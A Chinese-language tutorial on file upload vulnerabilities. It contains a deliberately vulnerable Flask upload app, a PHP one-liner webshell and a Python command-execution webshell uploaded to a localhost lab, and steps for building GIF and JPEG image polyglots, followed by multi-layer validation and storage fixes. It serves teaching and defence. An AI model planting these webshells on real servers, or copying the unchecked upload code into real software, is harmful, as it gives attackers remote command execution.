# 文件上传漏洞（File Upload Vulnerability）

> **一句话定义**：攻击者利用文件上传功能上传恶意文件（WebShell、恶意脚本等），实现对服务器的控制。

**危险等级**：🔴 严重

---

## 原理深度分析

### 为什么发生

文件上传漏洞的根源是**服务器对上传文件的内容、类型和后续访问缺乏足够的校验**。

### 攻击者能做什么

| 攻击场景 | 文件类型 | 后果 |
|----------|----------|------|
| WebShell | `.php`, `.asp`, `.jsp`, `.war` | 完全控制服务器 |
| 恶意脚本 | `.py`, `.sh`, `.exe` | 代码执行 |
| 恶意图片 | 图片马（图片中嵌入代码） | 绕过图片校验 |
| SVG 注入 | `.svg` | XSS/SSRF |
| 超大文件 | 任意 | 磁盘耗尽 |
| 文件覆盖 | 重名文件 | 覆盖关键文件 |

### 常见的脆弱校验

```python
# 🔴 只检查 Content-Type
# 攻击者可以用 Burp 修改 Content-Type

# 🔴 只检查文件扩展名
# 攻击者可以上传 image.php.jpg

# 🔴 只检查文件头魔数
# 攻击者可以在 PHP 代码前加 GIF89a
```

---

## 真实世界案例

### 案例 1：Shopify 文件上传 RCE（2018）

安全研究员通过 SVG 文件上传在 Shopify 系统上实现了 RCE。

- **攻击方式**：上传包含 XML 外部实体的 SVG 文件
- **利用链**：SVG 上传 → XXE → SSRF → 内部服务 → RCE
- **奖励**：$25,000 赏金
- **教训**：SVG 是 XML，可以执行任意操作

### 案例 2：GoDaddy 文件上传漏洞（2020）

GoDaddy 的 cPanel 文件管理器存在文件上传漏洞，攻击者可以上传 WebShell。

- **攻击方式**：通过文件管理器上传 PHP 文件
- **后果**：攻击者可以完全控制托管网站
- **教训**：文件管理器类型的工具必须严格限制上传类型

---

## 简单 POC

### 靶场代码

```python
# app.py — 有漏洞的文件上传
from flask import Flask, request, send_file, render_template_string
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return '''
    <html>
    <body>
        <h1>文件上传</h1>
        <form method="POST" action="/upload" enctype="multipart/form-data">
            <input type="file" name="file">
            <button type="submit">上传</button>
        </form>
    </body>
    </html>
    '''

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file:
        return "没有文件"
    
    # 🔴 漏洞1：没有校验任何内容
    filename = file.filename
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)
    
    return f"文件上传成功：<a href='/uploads/{filename}'>查看文件</a>"

# 🔴 漏洞2：上传的文件可以直接访问和执行
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_file(os.path.join(UPLOAD_FOLDER, filename))

if __name__ == '__main__':
    app.run(port=5009)
```

### 攻击演示

```bash
# 1. 上传 WebShell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
curl -X POST -F "file=@shell.php" "http://localhost:5009/upload"

# 2. 访问 WebShell 执行命令
curl "http://localhost:5009/uploads/shell.php?cmd=id"
# 或者用 Python 写 webshell
```

```python
# webshell.py — Python WebShell
import subprocess
import cgi
import io

# 上传后可以通过参数执行命令
# 访问：/uploads/webshell.py?cmd=whoami

import sys
from wsgiref.simple_server import make_server

def app(environ, start_response):
    params = cgi.parse_qs(environ.get('QUERY_STRING', ''))
    cmd = params.get('cmd', [''])[0]
    
    if cmd:
        try:
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            start_response('200 OK', [('Content-Type', 'text/plain')])
            return [result]
        except Exception as e:
            start_response('500 ERROR', [])
            return [str(e).encode()]
    
    start_response('200 OK', [('Content-Type', 'text/html')])
    return [b'<form><input name="cmd"><button>执行</button></form>']
```

### 图片马（绕过文件头校验）

```bash
# 创建图片马 — 在图片末尾追加 PHP 代码
echo 'GIF89a' > shell.gif  # 图片文件头（魔数）
echo '<?php system($_GET["cmd"]); ?>' >> shell.gif

# 或者用更隐蔽的方式
# 在 JPEG 末尾追加代码
python3 -c "
with open('evil.jpg', 'wb') as f:
    f.write(b'\xff\xd8\xff\xe0')  # JPEG 文件头
    f.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
    f.write(b'\xff\xd9')  # JPEG 文件尾
"
```

---

## 修复方案

### 方案 1：多层校验 ⭐⭐⭐⭐⭐

```python
import imghdr
import os
import magic  # python-magic

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
ALLOWED_MIME_TYPES = {
    'image/jpeg', 'image/png', 'image/gif', 'application/pdf'
}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def validate_file(file):
    """多层文件校验"""
    filename = file.filename
    if not filename:
        return False, "文件名不能为空"
    
    # 1. 检查文件扩展名
    ext = os.path.splitext(filename)[1].lower().lstrip('.')
    if ext not in ALLOWED_EXTENSIONS:
        return False, f"不支持的文件类型: .{ext}"
    
    # 2. 检查文件大小
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        return False, f"文件太大（最大 {MAX_FILE_SIZE/1024/1024}MB）"
    
    # 3. 检查 MIME 类型（使用文件内容检测，不依赖 Content-Type 头）
    mime = magic.from_buffer(file.read(2048), mime=True)
    file.seek(0)
    if mime not in ALLOWED_MIME_TYPES:
        return False, f"文件类型不匹配: {mime}"
    
    # 4. 检查文件头魔数
    header = file.read(20)
    file.seek(0)
    
    file_signatures = {
        b'\xff\xd8\xff': 'image/jpeg',
        b'\x89PNG': 'image/png',
        b'GIF89a': 'image/gif',
        b'GIF87a': 'image/gif',
        b'%PDF': 'application/pdf',
    }
    
    matched = False
    for sig, expected_mime in file_signatures.items():
        if header.startswith(sig):
            if mime == expected_mime:
                matched = True
                break
            else:
                return False, f"文件头与 MIME 类型不匹配"
    
    if not matched:
        return False, "无法识别的文件格式"
    
    return True, None

@app.route('/upload_fixed', methods=['POST'])
def upload_fixed():
    file = request.files.get('file')
    if not file:
        return "没有文件", 400
    
    is_valid, error = validate_file(file)
    if not is_valid:
        return f"校验失败: {error}", 400
    
    # ✅ 重命名文件，不使用用户提供的文件名
    import uuid
    ext = os.path.splitext(file.filename)[1].lower()
    safe_filename = f"{uuid.uuid4()}{ext}"
    filepath = os.path.join(UPLOAD_FOLDER, safe_filename)
    file.save(filepath)
    
    return f"上传成功"
```

### 方案 2：文件隔离存储 ⭐⭐⭐⭐⭐

```python
# ✅ 将上传文件存储在 Web 根目录之外
UPLOAD_FOLDER = '/data/uploads/'  # 不在 /var/www/html/ 下
SERVE_FOLDER = '/data/public/'    # 只放处理后的文件

# 或者使用对象存储（最安全）
import boto3  # AWS S3
s3 = boto3.client('s3')
s3.upload_fileobj(
    file,
    'my-bucket',         # S3 存储桶
    safe_filename,       
    ExtraArgs={
        'ContentType': mime,
        'ACL': 'private'  # 禁止公共访问，需要通过签名 URL
    }
)
# 通过预签名 URL 访问
url = s3.generate_presigned_url(
    'get_object',
    Params={'Bucket': 'my-bucket', 'Key': safe_filename},
    ExpiresIn=3600
)
```

### 方案 3：内容安全处理 ⭐⭐⭐⭐

```python
from PIL import Image

def sanitize_image(filepath):
    """重新编码图片，去除可能的恶意代码"""
    try:
        img = Image.open(filepath)
        # 重新保存（去除 EXIF 和多余数据）
        img.save(filepath, format=img.format, optimize=True)
        return True
    except Exception as e:
        return False
```

---

## 检测与防御工具

| 工具 | 用途 |
|------|------|
| [ClamAV](https://www.clamav.net/) | 上传文件病毒扫描 |
| [YARA](https://virustotal.github.io/yara/) | 恶意文件规则匹配 |
| [WebShell Detector](https://github.com/emposha/PHP-Shell-Detector) | PHP WebShell 检测 |
| [mod_security](https://modsecurity.org/) | WAF 规则保护 |

---

## 延伸阅读

1. [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
2. [OWASP Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
3. [PortSwigger File Upload 教程](https://portswigger.net/web-security/file-upload)
4. [PHP WebShell 分析](https://www.sans.org/white-papers/36892/)
5. [SVG 文件上传攻击](https://portswigger.net/research/svg-file-upload-vulnerability)
